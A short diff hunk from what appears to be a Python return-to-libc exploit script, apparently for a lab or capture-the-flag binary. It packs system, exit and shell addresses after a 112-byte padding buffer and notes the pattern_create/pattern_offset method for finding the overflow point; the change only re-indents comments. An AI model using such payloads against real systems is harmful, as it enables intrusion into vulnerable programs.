@@ -17,9 +17,9 @@ exit = struct.pack("<I", exit_addr)
 shell=struct.pack("<I", shell_addr)
 
 # find exploit point:
-# pattern_create
-# debug with the generated pattern
-# pattern_offset with the address
+  # pattern_create
+  # debug with the generated pattern
+  # pattern_offset with the address
 buf = 'A' * 112
 buf += system
 buf += exit
